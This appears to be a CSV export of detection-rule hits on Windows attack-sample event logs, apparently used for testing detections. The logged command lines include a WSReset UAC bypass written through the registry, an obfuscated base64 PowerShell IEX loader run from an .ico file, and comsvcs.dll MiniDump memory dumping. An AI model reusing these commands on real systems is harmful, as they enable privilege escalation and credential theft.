2019-08-04T10:16:31.949078+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,1,5947,MSEDGEWIN10,"Image: C:\Windows\System32\WSReset.exe
RuleName: ''
Description: This tool resets the Windows Store without changing account settings or deleting installed apps
TerminalSessionId: 1
ParentCommandLine: UACME.exe  56
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7588
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=A75F9C233E1C56AD0B3A0FDCFF1368E7FB3EA1D7,MD5=0D2BE4AE7AE5B93B47E12F4EFF38A0D7,SHA256=5FDDA5D5E3AE48A72CD3E71410BF0A67512B7793006CAB5878D1361000616AD6,IMPHASH=AB03184F9306BF7E8482C6F987BA1832
ParentProcessGuid: 747F3D96-B07D-5D46-0000-00103C8C0F04
ProcessId: 200
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-B07F-5D46-0000-001050C80F04
CommandLine: '""C:\Windows\system32\WSReset.exe"" '
FileVersion: 10.0.17763.592 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-04 10:16:31.884
"
2019-08-04T10:16:32.001792+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,1,5948,MSEDGEWIN10,"Image: C:\Windows\System32\consent.exe
RuleName: ''
Description: Consent UI for administrative applications
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 896
LogonGuid: 747F3D96-D4E9-5D45-0000-0020E7030000
Hashes: SHA1=9329B2362078DE27242DD4534F588AF3264BF0BF,MD5=27992D7EBE51AEC655A088DE88BAD5C9,SHA256=8F112431143A22BAAAFB448EEFD63BF90E7691C890AC69A296574FD07BA03EC6,IMPHASH=522D83761201075834F05037F5307949
ParentProcessGuid: 747F3D96-5769-5D45-0000-001044E83300
ProcessId: 3952
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-B07F-5D46-0000-0010C1CB0F04
CommandLine: consent.exe 896 312 000002806444CB40
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: NT AUTHORITY\SYSTEM
LogonId: '0x3e7'
IntegrityLevel: System
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-04 10:16:31.980
"
2019-08-04T10:16:32.438711+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process;UAC Bypass WSReset,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,1,5949,MSEDGEWIN10,"Image: C:\Windows\System32\WSReset.exe
RuleName: ''
Description: This tool resets the Windows Store without changing account settings or deleting installed apps
TerminalSessionId: 1
ParentCommandLine: UACME.exe  56
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7588
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=A75F9C233E1C56AD0B3A0FDCFF1368E7FB3EA1D7,MD5=0D2BE4AE7AE5B93B47E12F4EFF38A0D7,SHA256=5FDDA5D5E3AE48A72CD3E71410BF0A67512B7793006CAB5878D1361000616AD6,IMPHASH=AB03184F9306BF7E8482C6F987BA1832
ParentProcessGuid: 747F3D96-B07D-5D46-0000-00103C8C0F04
ProcessId: 2112
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-B080-5D46-0000-0010D4EA0F04
CommandLine: '""C:\Windows\system32\WSReset.exe"" '
FileVersion: 10.0.17763.592 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Users\IEUser\Desktop\UACME.exe
UtcTime: 2019-08-04 10:16:32.267
"
2019-08-04T10:16:50.009124+00:00,Bypass UAC via WSReset.exe;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,1,5950,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\WSReset.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2112
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-B080-5D46-0000-0010D4EA0F04
ProcessId: 820
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-B091-5D46-0000-001081F71104
CommandLine: '""C:\Windows\system32\cmd.exe"" /c start C:\Windows\system32\cmd.exe'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WSReset.exe
UtcTime: 2019-08-04 10:16:49.960
"
2019-08-04T10:16:50.455910+00:00,Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,1,5951,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c start C:\Windows\system32\cmd.exe'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 820
LogonGuid: 747F3D96-56A3-5D45-0000-0020B3D31800
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-B091-5D46-0000-001081F71104
ProcessId: 7792
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-B092-5D46-0000-001089041204
CommandLine: 'C:\Windows\system32\cmd.exe '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3b3'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-08-04 10:16:50.403
"
2019-08-04T10:16:55.299641+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,1,5952,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: sihost.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4772
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-56A4-5D45-0000-0010A5FA1800
ProcessId: 1960
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-B097-5D46-0000-0010E1321204
CommandLine: C:\Windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command /v """" /t REG_SZ /d ""C:\Windows\system32\cmd.exe /c start C:\Windows\system32\cmd.exe"" /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\sihost.exe
UtcTime: 2019-08-04 10:16:55.294
"
2019-08-04T10:16:55.441262+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,13,5953,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000_Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command\(Default)
RuleName: PrivEsc - UAC bypass UACME-56
EventType: SetValue
ProcessId: 1960
ProcessGuid: 747F3D96-B097-5D46-0000-0010E1321204
UtcTime: 2019-08-04 10:16:55.415
Details: C:\Windows\system32\cmd.exe /c start C:\Windows\system32\cmd.exe
"
2019-08-04T10:16:55.446479+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Sysmon_UACME_56.evtx,1,Microsoft-Windows-Sysmon,1,5954,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: sihost.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4772
LogonGuid: 747F3D96-56A3-5D45-0000-0020FBD31800
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-56A4-5D45-0000-0010A5FA1800
ProcessId: 3444
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 747F3D96-B097-5D46-0000-0010E7381204
CommandLine: C:\Windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command /v ""DelegateExecute"" /t REG_SZ /d ""{4ED3A719-CEA8-4BD9-910D-E252F997AFC2}"" /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x18d3fb'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\sihost.exe
UtcTime: 2019-08-04 10:16:55.438
"
2019-08-05T09:39:30.697730+00:00,Outgoing Logon with New Credentials;Pass the Hash Activity 2;Successful Overpass the Hash Attempt,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/Invoke_TokenDuplication_UAC_Bypass4624.evtx,1,Microsoft-Windows-Security-Auditing,4624,10113,MSEDGEWIN10,"AuthenticationPackageName: Negotiate
LogonProcessName: seclogo
TargetOutboundDomainName: o
TargetLinkedLogonId: '0x0'
LmPackageName: '-'
TargetDomainName: MSEDGEWIN10
SubjectUserName: IEUser
TargetUserSid: S-1-5-21-3461203602-4096304019-2269080069-1000
IpAddress: ::1
KeyLength: 0
SubjectLogonId: '0x2e4ce'
TargetLogonId: '0x38f87e'
ElevatedToken: '%%1843'
LogonGuid: 00000000-0000-0000-0000-000000000000
RestrictedAdminMode: '-'
SubjectDomainName: MSEDGEWIN10
LogonType: 9
VirtualAccount: '%%1843'
TargetOutboundUserName: l
WorkstationName: '-'
IpPort: '0'
ImpersonationLevel: '%%1833'
SubjectUserSid: S-1-5-21-3461203602-4096304019-2269080069-1000
TransmittedServices: '-'
ProcessId: '0x1b90'
TargetUserName: IEUser
ProcessName: C:\Windows\System32\svchost.exe
"
2019-08-14T11:53:29.688460+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/susp_explorer_exec.evtx,1,Microsoft-Windows-Sysmon,1,10660,MSEDGEWIN10,"Image: C:\Windows\explorer.exe
RuleName: ''
Description: Windows Explorer
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4824
LogonGuid: 747F3D96-F419-5D53-0000-002026910200
Hashes: SHA1=B484455078341FE22D2D6CD5428672B36CFE9421,MD5=963AF95C42A986BBBB0B5C842140E008,SHA256=D9FCB47915363186AEC3EF3EDAE0D92AC452BFA5A41C81D5E714E45583600561,IMPHASH=D0321829F69F40C0D0D15614DB56687C
ParentProcessGuid: 747F3D96-F41E-5D53-0000-001067C80300
ProcessId: 1052
CurrentDirectory: C:\windows\
ProcessGuid: 747F3D96-F639-5D53-0000-001067DA2600
CommandLine: '""C:\windows\explorer.exe"" shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x29126'
IntegrityLevel: Medium
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-08-14 11:53:29.423
"
2019-08-14T11:53:30.010140+00:00,Hacktool - EDR-Freeze Execution,data/EVTX-ATTACK-SAMPLES/Execution/susp_explorer_exec.evtx,1,Microsoft-Windows-Sysmon,1,10661,MSEDGEWIN10,"Image: C:\Windows\explorer.exe
RuleName: ''
Description: Windows Explorer
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 804
LogonGuid: 747F3D96-F419-5D53-0000-002026910200
Hashes: SHA1=B484455078341FE22D2D6CD5428672B36CFE9421,MD5=963AF95C42A986BBBB0B5C842140E008,SHA256=D9FCB47915363186AEC3EF3EDAE0D92AC452BFA5A41C81D5E714E45583600561,IMPHASH=D0321829F69F40C0D0D15614DB56687C
ParentProcessGuid: 747F3D96-F413-5D53-0000-0010FA6E0000
ProcessId: 6000
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-F639-5D53-0000-001092EE2600
CommandLine: C:\Windows\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x29126'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\svchost.exe
UtcTime: 2019-08-14 11:53:29.641
"
2019-08-14T11:53:30.022856+00:00,Base64 Encoded PowerShell Command Detected;Hacktool - EDR-Freeze Execution;Non-privileged Usage of Reg or Powershell;PowerShell Base64 Encoded IEX Cmdlet;Script Interpreter Execution From Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Execution/susp_explorer_exec.evtx,1,Microsoft-Windows-Sysmon,1,10662,MSEDGEWIN10,"Image: C:\Windows\System32\wscript.exe
RuleName: ''
Description: Microsoft ® Windows Based Script Host
TerminalSessionId: 1
ParentCommandLine: C:\Windows\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 6000
LogonGuid: 747F3D96-F419-5D53-0000-002026910200
Hashes: SHA1=267D05CE8D10D97620BE1C7773757668BAEB19EE,MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C
ParentProcessGuid: 747F3D96-F639-5D53-0000-001092EE2600
ProcessId: 8180
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-F639-5D53-0000-0010B0FC2600
CommandLine: '""c:\windows\system32\wscript.exe"" /E:vbs c:\windows\temp\icon.ico ""powershell -exec bypass -c """"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(''JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp'')))""""""'
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0x29126'
IntegrityLevel: Medium
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-08-14 11:53:29.768
"
2019-08-14T12:17:14.614739+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;Potentially Suspicious Rundll32 Activity;Rundll32 Registered COM Objects;Rundll32 Spawned Via Explorer.EXE,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbas_rundll32_zipfldr_routethecall_shell.evtx,1,Microsoft-Windows-Sysmon,1,10674,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4824
LogonGuid: 747F3D96-F419-5D53-0000-002026910200
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-F41E-5D53-0000-001067C80300
ProcessId: 2476
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-FBCA-5D53-0000-0010B8664100
CommandLine: '""C:\Windows\system32\rundll32.exe"" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x29126'
IntegrityLevel: Medium
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-08-14 12:17:14.447
"
2019-08-14T12:17:14.893930+00:00,Base64 Encoded PowerShell Command Detected;Hacktool - EDR-Freeze Execution;Non-privileged Usage of Reg or Powershell;PowerShell Base64 Encoded IEX Cmdlet;Script Interpreter Execution From Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Execution/sysmon_lolbas_rundll32_zipfldr_routethecall_shell.evtx,1,Microsoft-Windows-Sysmon,1,10675,MSEDGEWIN10,"Image: C:\Windows\System32\wscript.exe
RuleName: ''
Description: Microsoft ® Windows Based Script Host
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\rundll32.exe"" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}'
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 2476
LogonGuid: 747F3D96-F419-5D53-0000-002026910200
Hashes: SHA1=267D05CE8D10D97620BE1C7773757668BAEB19EE,MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C
ParentProcessGuid: 747F3D96-FBCA-5D53-0000-0010B8664100
ProcessId: 2876
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-FBCA-5D53-0000-001036784100
CommandLine: '""c:\windows\system32\wscript.exe"" /E:vbs c:\windows\temp\icon.ico ""powershell -exec bypass -c """"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(''JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp'')))""""""'
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0x29126'
IntegrityLevel: Medium
ParentImage: C:\Windows\System32\rundll32.exe
UtcTime: 2019-08-14 12:17:14.661
"
2019-08-30T12:54:07.873789+00:00,HackTool - HandleKatz LSASS Dumper Execution;Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_1_memdump_comsvcs_minidump.evtx,1,Microsoft-Windows-Sysmon,1,32151,MSEDGEWIN10,"Image: C:\Windows\System32\cscript.exe
RuleName: ''
Description: Microsoft ® Console Based Script Host
TerminalSessionId: 1
ParentCommandLine: C:\Windows\System32\cmd.exe
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 2128
LogonGuid: 747F3D96-1B6A-5D69-0000-0020E5810E00
Hashes: SHA1=0E3C0779D8EAAD3B00363D7890DDC8272B510D49,MD5=A45586B3A5A291516CD10EF4FD3EE768,SHA256=59D3CDC7D51FA34C6B27B8B04EA17992955466EB25022B7BD64880AB35DF0BBC,IMPHASH=2B44D2206B9865383429E9C1524F1CAC
ParentProcessGuid: 747F3D96-1B6C-5D69-0000-00106F060F00
ProcessId: 2576
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-1C6F-5D69-0000-0010323C1F00
CommandLine: cscript  c:\ProgramData\memdump.vbs notepad.exe
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0xe81e5'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-08-30 12:54:07.823
"
2019-08-30T12:54:08.354049+00:00,CobaltStrike Load by Rundll32;HackTool - HandleKatz LSASS Dumper Execution;Hacktool - EDR-Freeze Execution;Potentially Suspicious Rundll32 Activity;Process Memory Dump Via Comsvcs.DLL;Suspicious WmiPrvSE Child Process;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_1_memdump_comsvcs_minidump.evtx,1,Microsoft-Windows-Sysmon,1,32154,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
TerminalSessionId: 1
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1144
LogonGuid: 747F3D96-1B6A-5D69-0000-0020E5810E00
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-1C70-5D69-0000-0010D4551F00
ProcessId: 2888
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-1C70-5D69-0000-0010C9661F00
CommandLine: rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4868 C:\Windows\System32\notepad.bin full
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0xe81e5'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2019-08-30 12:54:08.331
"
2019-08-30T12:54:08.439957+00:00,Uncommon Process Access Rights For Target Image,data/EVTX-ATTACK-SAMPLES/Credential Access/sysmon_10_1_memdump_comsvcs_minidump.evtx,1,Microsoft-Windows-Sysmon,10,32156,MSEDGEWIN10,"TargetProcessId: 4868
TargetImage: C:\Windows\system32\notepad.exe
SourceThreadId: 2796
RuleName: CredAccess - Memdump
GrantedAccess: '0x1fffff'
SourceProcessGUID: 747F3D96-1C70-5D69-0000-0010C9661F00
SourceProcessId: 2888
TargetProcessGUID: 747F3D96-1C5C-5D69-0000-0010FEB71E00
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9fc24|C:\Windows\SYSTEM32\ntdll.dll+7a747|C:\Windows\System32\KERNEL32.DLL+1c5b4|C:\Windows\System32\KERNEL32.DLL+237f8|C:\Windows\SYSTEM32\dbgcore.DLL+9247|C:\Windows\SYSTEM32\dbgcore.DLL+15dc5|C:\Windows\SYSTEM32\dbgcore.DLL+fec6|C:\Windows\SYSTEM32\dbgcore.DLL+5f56|C:\Windows\SYSTEM32\dbgcore.DLL+69f7|C:\windows\system32\comsvcs.dll+3c3d4|C:\Windows\system32\rundll32.exe+3bcf|C:\Windows\system32\rundll32.exe+6299|C:\Windows\System32\KERNEL32.DLL+17974|C:\Windows\SYSTEM32\ntdll.dll+6a271
UtcTime: 2019-08-30 12:54:08.424
SourceImage: C:\Windows\system32\rundll32.exe
"
2019-09-08T19:17:44.249169+00:00,PUA - Sysinternal Tool Execution - Registry;PUA - Sysinternals Tools Execution - Registry;Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Persistence/persist_valid_account_guest_rid_hijack.evtx,1,Microsoft-Windows-Sysmon,13,38292,MSEDGEWIN10,"Image: C:\Users\IEUser\Desktop\PsExec64.exe
TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Sysinternals\PsExec\EulaAccepted
RuleName: ''
EventType: SetValue
ProcessId: 6868
ProcessGuid: 747F3D96-53D8-5D75-0000-00101811CD00
UtcTime: 2019-09-08 19:17:44.203
Details: DWORD (0x00000001)
"
2019-09-08T19:17:44.350762+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Persistence/persist_valid_account_guest_rid_hijack.evtx,1,Microsoft-Windows-Sysmon,13,38294,MSEDGEWIN10,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\PSEXESVC\Start
RuleName: ''
EventType: SetValue
ProcessId: 576
ProcessGuid: 747F3D96-64F9-5D75-0000-001038560000
UtcTime: 2019-09-08 19:17:44.296
Details: DWORD (0x00000003)
"
2019-09-08T19:17:44.391389+00:00,Service Binary in Suspicious Folder,data/EVTX-ATTACK-SAMPLES/Persistence/persist_valid_account_guest_rid_hijack.evtx,1,Microsoft-Windows-Sysmon,13,38295,MSEDGEWIN10,"Image: C:\Windows\system32\services.exe
TargetObject: HKLM\System\CurrentControlSet\Services\PSEXESVC\ImagePath
RuleName: ''
EventType: SetValue
ProcessId: 576
ProcessGuid: 747F3D96-64F9-5D75-0000-001038560000
UtcTime: 2019-09-08 19:17:44.296
Details: '%%SystemRoot%%\PSEXESVC.exe'
"
2019-09-09T13:35:08.655802+00:00,Suspicious FromBase64String Usage On Gzip Archive - Ps Script,data/EVTX-ATTACK-SAMPLES/Credential Access/phish_windows_credentials_powershell_scriptblockLog_4104.evtx,1,Microsoft-Windows-PowerShell,4104,1122,MSEDGEWIN10,"MessageNumber: 1
